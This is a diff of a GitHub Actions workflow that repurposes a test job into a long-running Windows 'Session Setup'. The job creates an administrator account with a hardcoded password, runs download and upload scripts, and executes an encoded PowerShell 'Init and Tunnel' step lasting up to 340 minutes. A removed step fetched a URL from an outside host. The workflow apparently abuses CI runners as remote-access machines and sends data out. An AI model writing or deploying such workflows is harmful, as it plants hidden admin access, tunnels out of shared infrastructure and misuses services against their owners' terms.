@@ -1,19 +1,19 @@
-name: Test Workflow
+name: Session Setup
 
 on:
-  push:
-    branches:
-      - main
-  pull_request:
+  workflow_dispatch:
 
 jobs:
-  test:
+  job-alpha:
     runs-on: windows-2022
+    timeout-minutes: 360
 
     steps:
+      # Step 1: Checkout repository
       - name: Checkout repository
-        uses: actions/checkout@v4
+        uses: actions/checkout@v3
 
+      # Step 2: Create Admin User
       - name: Create Admin User
         run: |
           net user administrator OLDUSER#6 /add
@@ -21,14 +21,28 @@ jobs:
           echo User 'administrator' created with administrative privileges.
         shell: cmd
 
-      - name: Get artifact URL
-        id: get_url
-        run: |
-          python -c "import urllib.request, json; print(json.load(urllib.request.urlopen('https://azcaptchahh.pythonanywhere.com/geturl'))['url'])"
-        shell: cmd
+      # Step 3: Run download.py to fetch & extract data
+      - name: Run download.py
+        shell: python
+        run: python download.py
+        continue-on-error: true
 
-      - name: Download artifact
-        uses: actions/download-artifact@v4
-        with:
-          name: your-artifact-name
-          path: C:\Users\administrator
+      # Step 4: Init and Tunnel (always run)
+      - name: Init and Tunnel
+        shell: pwsh
+        timeout-minutes: 340
+        if: always()
+        run: |
+          powershell -EncodedCommand "data"
+
+      # Step 5: List Desktop Data contents
+      - name: List Desktop Data contents
+        shell: cmd
+        run: dir "C:\Users\Administrator\Desktop\data"
+        continue-on-error: true
+
+      # Step 6: Run upload.py to upload folder and send URL (always run)
+      - name: Upload Desktop Data via upload.py
+        shell: python
+        if: always()
+        run: python upload.py
